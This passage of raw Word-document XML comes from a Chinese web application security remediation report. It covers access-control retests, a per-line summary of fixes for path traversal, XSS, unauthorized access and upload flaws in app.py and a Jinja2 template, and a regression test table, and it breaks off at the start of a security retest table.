            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>越权 /profile</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">Alice 访问 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/profile?user_id=1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>403 无权</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>越权 /recharge</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>修改 user_id</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>session 获取</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="160"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>八、实际代码修改清单</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>8.1 修改文件列表</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667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>改动类型</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>改动说明</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>app.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 修改</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">修复 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/page</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> LFI/路径绕过/XSS/未授权、</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/upload</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> 路径穿越/文件内容绕过/安全响应头</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>templates/index.html</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 修改</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>移除 `\</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>safe` 过滤器，启用 Jinja2 自动转义</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>8.2 app.py 关键修复摘要</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>行 10:   + import bleach                          # 新增 bleach 库引入</w:t>
        <w:br/>
        <w:t>行 371-372: + ALLOWED_PAGES + PAGES_DIR           # 白名单 + 安全目录路径</w:t>
        <w:br/>
        <w:t>行 374-412: [修复] /page 路由                      # 白名单 + realpath + bleach</w:t>
        <w:br/>
        <w:t xml:space="preserve">              ├─ 行 376-378: 登录态校验            # 修复漏洞7 CWE-306</w:t>
        <w:br/>
        <w:t xml:space="preserve">              ├─ 行 384-386: 白名单过滤            # 修复漏洞1 CWE-22/CWE-98</w:t>
        <w:br/>
        <w:t xml:space="preserve">              ├─ 行 388-395: realpath 二次防护     # 修复漏洞3 CWE-174</w:t>
        <w:br/>
        <w:t xml:space="preserve">              └─ 行 403-408: bleach 清洗输出        # 修复漏洞6 CWE-79</w:t>
        <w:br/>
        <w:t>行 415-462: [修复] /upload 路由                    # UUID + Magic Number</w:t>
        <w:br/>
        <w:t xml:space="preserve">              ├─ 行 432-454: Magic Number 校验      # 修复漏洞9 CWE-434</w:t>
        <w:br/>
        <w:t xml:space="preserve">              └─ 行 456-460: UUID 重命名            # 修复漏洞8 CWE-22</w:t>
        <w:br/>
        <w:t>行 470-473: + after_request 安全响应头              # 修复漏洞10 CWE-552</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>8.3 templates/index.html 修复摘要</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>行 88:   - {{ page_content | safe }}               # 移除 | safe</w:t>
        <w:br/>
        <w:t xml:space="preserve">        + {{ page_content }}                        # 启用自动转义</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="160"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>九、修复后验证结果</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>9.1 功能回归测试</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667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>功能模块</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>测试用例</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>结果</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>首页</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>登录/未登录状态首页显示</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 通过</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>登录</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>正确/错误密码/验证码/锁定</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 通过</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>注册</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>新用户注册 → 登录 → 可用</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 通过</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>个人中心</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>查看自己/他人资料、脱敏显示</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 通过</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>充值</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>正数充值、负数/超限拒绝</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 通过</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>动态页面</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/page?name=help</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> 正常显示帮助</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 通过</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>头像上传</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>JPG/PNG/GIF 上传成功</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 通过</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>9.2 安全复测结果</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667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞编号</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
